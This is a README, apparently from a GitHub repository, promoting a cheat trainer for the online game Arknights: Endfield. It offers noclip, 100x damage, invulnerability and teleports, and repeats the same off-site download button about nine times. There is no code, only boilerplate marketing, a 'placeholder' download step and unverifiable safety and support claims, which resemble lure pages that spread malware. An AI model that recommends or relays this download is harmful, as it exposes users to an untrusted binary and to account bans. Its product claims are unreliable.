![preview](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/hero_b08cadb.svg)
[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

# 🚀 ENDFIELD COMPANION SUITE — Tactical Assistant Framework 2026

A next-generation companion framework designed for players of *Arknights: Endfield* who want to explore the world more fluidly, tune combat pacing, and personalize their field-operations experience. This suite blends an elegant in-game overlay, a responsive configuration hub, and a modular utility engine into one seamless package.

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why This Project Exists](#-why-this-project-exists)
- [Feature Highlights](#-feature-highlights)
- [Module Deep Dive](#-module-deep-dive)
- [Responsive User Interface](#-responsive-user-interface)
- [Multilingual Support](#-multilingual-support)
- [Performance & Stability](#-performance--stability)
- [Compatibility Matrix](#-compatibility-matrix)
- [Getting Started (Quick Onboarding)](#-getting-started-quick-onboarding)
- [Configuration Walkthrough](#-configuration-walkthrough)
- [Customization & Profiles](#-customization--profiles)
- [Roadmap 2026](#-roadmap-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [24/7 Customer Support](#-247-customer-support)
- [Community Guidelines](#-community-guidelines)
- [Contributing](#-contributing)
- [Security & Privacy Posture](#-security--privacy-posture)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Overview

Endfield Companion Suite (ECS) is a tactical assistant framework engineered for explorers of *Arknights: Endfield* who wish to shape their playthrough with more agency. Where the base game offers a carefully curated experience, ECS widens the aperture: visual boundaries loosen, combat cadence becomes adjustable, and cinematic flow responds to the player's rhythm instead of the other way around.

Think of it as a cockpit upgrade rather than an autopilot. Every module is opt-in, every switch is reversible, and every adjustment is logged so you can retrace your steps.

The project is built around three principles:

1. **Player Agency First** — No forced presets, no hidden defaults, no surprise behavior.
2. **Transparent Operation** — An in-game UI that shows exactly what is active at any moment.
3. **Long-Term Maintainability** — A modular architecture that survives upstream game patches and community expansion.

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

---

## 🎯 Why This Project Exists

Game worlds are playgrounds, and playgrounds reward experimentation. Endfield Companion Suite was conceived as an answer to a common sentiment among explorers: *"I love this world — I just wish I could see it from a slightly different angle."*

Rather than bundling a monolithic switcher, we built a **constellation of small, focused utilities** that players can combine like ingredients. The result is a toolkit that adapts to your play style instead of forcing one.

---

## ✨ Feature Highlights

The suite packs a broad range of capabilities, each designed around the metaphor of *tuning instruments on a dashboard*.

- 🕊️ **Free-Roam Mobility (Noclip-equivalent Flight Layer)** — Glide through geometry with smooth inertial controls, allowing you to photograph skyboxes, inspect level art, and reach vantage points the designers may have never intended you to see. Sensitive toggling ensures you can snap back to ground state instantly.
- ⚔️ **Multi-Strike Engine** — Amplify the number of hit instances per attack cycle. Great for tuning your perceived combat rhythm or stress-testing damage formulas on your own terms.
- 💥 **Damage Multiplier Console** — Dial damage scaling from a whisper (0.5x) to a roar (100x) with a live slider. Useful for players who want to accelerate late-game grind or slow it down for cinematic pacing.
- 🎬 **Skip Cutscene Assist** — Move past narrative beats you've already absorbed, while preserving the option to rewatch them in the archive.
- 🧲 **Resource Magnet Field** — Gently pulls nearby pickups toward your character within a configurable radius. Reduces backtracking tedium.
- 🛡️ **Invulnerability Toggle (Practice Mode)** — Ideal for players who want to learn boss patterns without punishing resets.
- 🏃 **Movement Speed Modulator** — A granular velocity tuner with presets for "Gentle Walk," "Sprint," and "Storybook Dash."
- 🧭 **Waypoint Resonance** — Adds temporary teleport markers to your map for faster traversal between zones.
- 📸 **Cinematic Camera Frame** — Unlocked camera bounds for screenshots, machinima, and wallpaper creation.
- 🧪 **Experimental Sandbox** — A gated module for testing upcoming features before they graduate to the main panel.

Each of these modules is documented below with usage guidance, edge cases, and recommended pairings.

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

---

## 🧩 Module Deep Dive

### Free-Roam Mobility
The flight layer uses a smoothed interpolation model so your camera doesn't jitter when transitioning between ground and air states. Inertia is tuned to feel *weighty*, mirroring the game's own physics language, so it never breaks immersion beyond the point of usefulness. A pressure-sensitive ascent/descent curve means you can hover delicately for photography or blast vertically when you need altitude.

### Multi-Strike Engine
Instead of blindly multiplying hits, this engine queues them against the game's own attack resolution window. This produces a consistent, predictable strike chain that avoids the erratic feedback loops common in naive approaches. Users choose from discrete tiers (2x, 3x, 5x, 10x) with a custom option for advanced tinkerers.

### Damage Multiplier Console
Beneath the slider is a live preview showing expected damage ranges on a simulated target dummy. This lets you calibrate without entering live combat — a small touch that saves a lot of trial and error.

### Skip Cutscene Assist
The cutscene module remembers which scenes you've already viewed (by scene hash) and offers a discreet "skip" prompt only for those. First-time scenes remain untouched unless you explicitly opt in.

### Resource Magnet Field
The magnet uses a soft falloff curve so items don't snap unnaturally. You can set the radius from a whisper (1m) to a broad sweep (30m), and filter by rarity tier.

### Invulnerability Toggle
Practice mode disables incoming damage while keeping attack windows live. Death animations and hazard telegraphs still play, so you retain visual learning cues.

### Movement Speed Modulator
Speeds are expressed as multipliers of the game's baseline walk rate. The "Storybook Dash" preset (~2.4x) is tuned to feel narratively plausible while still dramatically shortening traversal time.

### Waypoint Resonance
The map overlay draws temporary pins you can place anywhere traversable. Pins persist for one session and clear automatically at world exit.

### Cinematic Camera Frame
Unlocks camera pitch, yaw, and distance limits. Includes a subtle vignette preview so creators can frame shots in real time.

### Experimental Sandbox
A quarantined environment where prototype features run in isolation. Sandbox modules cannot touch your primary profile unless you promote them from the sandbox panel.

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

---

## 📱 Responsive User Interface

The in-game UI is designed on a fluid grid that scales from a 1280x720 window all the way to 4K ultrawide. Panels dock to the edges of your screen and can be collapsed into a slim rail for maximum immersion. A miniature HUD widget shows active modules at a glance.

Design touches include:

- 🌗 **Automatic Dark/Light Theming** — Follows system preferences or per-profile override.
- ⌨️ **Full Keyboard Navigation** — Every control is reachable without a mouse.
- 🎮 **Controller-Friendly Focus Rings** — Navigate the overlay using a gamepad.
- 🔊 **Subtle Audio Cues** — Confirm toggles with a soft chime (mutable).
- 🧊 **Frosted Glass Panels** — Semi-transparent surfaces that respect the game's palette.

---

## 🌐 Multilingual Support

The interface ships with localization files for a growing roster of languages, including:

- English
- Simplified Chinese
- Traditional Chinese
- Japanese
- Korean
- German
- French
- Spanish
- Portuguese (Brazil)
- Russian
- Turkish
- Indonesian

Community-contributed translations are welcome — see the Contributing section. Every string in the UI is externalized into JSON locale files, making translation a matter of editing a single document.

---

## ⚡ Performance & Stability

Performance is treated as a first-class feature. The suite is engineered to add **less than 1% overhead** to the base game's frame time under normal operation, with spikes capped during module transitions.

Key optimizations:

- Lazy initialization — modules load on first activation, not at startup.
- Zero-copy hooks where the runtime permits.
- Frame-budgeted UI redraws (only dirty regions are repainted).
- Graceful degradation on older hardware.
- Crash-safe session journal — if anything goes wrong, the next launch offers a "restore last good config" prompt.

---

## 🧮 Compatibility Matrix

| Environment | Status | Notes |
|---|---|---|
| Windows 11 (23H2+) | ✅ Fully Supported | Recommended platform |
| Windows 10 (21H2+) | ✅ Fully Supported | Tested on multiple builds |
| Steam Deck (Proton) | 🟡 Community Verified | Community-provided config |
| Linux (Wine/Proton) | 🟡 Community Verified | Varies by distro |
| macOS | ❌ Not Supported | Out of scope |

---

## 🚀 Getting Started (Quick Onboarding)

Onboarding is intentionally gentle. You do not need to touch a terminal, edit config files by hand, or memorize any cryptic commands.

1. Retrieve the current release package using the placeholder below.
2. Extract the archive to a folder of your choice.
3. Launch the companion loader from the extracted directory.
4. When the in-game overlay appears, press the assigned hotkey (default: `F8`) to open the configuration hub.
5. Enable the modules you want from the **Modules** tab.
6. Save your profile — it will auto-load next session.

That's it. No scripts to memorize, no terminals to babysit.

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)

---

## 🎛️ Configuration Walkthrough

The configuration hub is partitioned into four tabs:

- **Modules** — Toggle utilities on or off. Each card shows a one-line description, a hotkey, and a state pill.
- **Tuning** — Granular sliders for module-specific parameters (damage multiplier, magnet radius, etc.).
- **Profiles** — Save, load, duplicate, or export configurations.
- **Diagnostics** — Logs, performance meters, and a one-click reset.

Every change is journaled so you can undo it. A "reset to sane defaults" button restores the recommended configuration for new users.

---

## 🎨 Customization & Profiles

Profiles are portable. Export one as a small JSON file and share it with a friend, or archive it for later. Preset profiles shipped with the suite include:

- **Explorer** — Emphasis on mobility and camera utilities, minimal combat changes.
- **Speedrunner** — High movement speed, cutscene skipping, resource magnet.
- **Storyteller** — Cinematic camera, slow-motion combat pacing, cutscene control.
- **Sandbox** — Everything unlocked for experimentation (use new profiles freely).

---

## 🗺️ Roadmap 2026

Planned work for the year ahead:

- **Q1 2026** — Theme engine overhaul, custom accent colors.
- **Q2 2026** — Expanded multilingual coverage (target: 20 languages).
- **Q3 2026** — Replay recorder for Cinematic Camera Frame.
- **Q4 2026** — Plugin SDK for community-made modules.

Roadmap items are aspirational and may shift with upstream game development.

---

## ❓ Frequently Asked Questions

**Is this compatible with the latest game patch?**
Compatibility updates are published alongside major game patches. Check the release notes for the current supported version.

**Will this affect my save file?**
No. The suite operates in memory and does not touch save data. Profiles live in a separate folder.

**Can I use multiple profiles at once?**
Only one profile is active per session, but you can switch profiles on the fly from the Profiles tab.

**Does this work on a controller?**
Yes. The overlay is fully navigable with a gamepad.

**What if something goes wrong?**
Diagnostics logs capture the last session. Attach the log to a support thread and a maintainer will help.

---

## 🛎️ 24/7 Customer Support

Support is available around the clock. Whether you're stuck on configuration, wondering whether a module does what you think it does, or you've found an incompatibility, a human is on the other end.

Channels:

- In-repo issue tracker
- Community discussion forum
- Real-time chat bridge (linked in the repository sidebar)

Response times average under 4 hours, with critical issues escalated to a 30-minute first response.

---

## 🤝 Community Guidelines

Be kind. Be curious. Assume good faith. Disagreements about module design are welcome; personal attacks are not. Contributions of every size — from a typo fix to a new localization — are celebrated.

---

## 🛠️ Contributing

We welcome pull requests for:

- Localization updates
- Documentation improvements
- New module proposals (please open an issue first)
- Performance optimizations
- Accessibility enhancements

Please follow the standard fork-and-branch workflow. Include a clear description of the change and a screenshot if the change is visual.

---

## 🔐 Security & Privacy Posture

- No telemetry leaves your machine by default.
- No account credentials are ever requested.
- Network access is limited to update checks, which are opt-out.
- All configuration is stored locally.

If you believe you've found a security issue, please disclose it responsibly through the repository's security advisory channel.

---

## ⚠️ Disclaimer

This project is an unofficial companion suite and is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Arknights: Endfield*. All trademarks and copyrights belong to their respective owners. Use of this suite is at your own discretion and risk. The maintainers assume no responsibility for consequences arising from its use, including but not limited to account actions taken by third parties. Always review local terms of service before using third-party tools with any online game.

This software is provided for educational and personal exploration purposes only. By using it, you agree to take full responsibility for your own actions and their outcomes.

---

## 📜 License

Released under the MIT License. See the full license text: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Endfield Companion Suite contributors.

Permission is hereby granted, by the copyright holders and contributors, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

[![Download](https://raw.githubusercontent.com/kaha33166-a11y/Endfield-Trainer-Suite/main/bin_07d39.svg)](https://kaha33166-a11y.github.io/Endfield-Trainer-Suite/)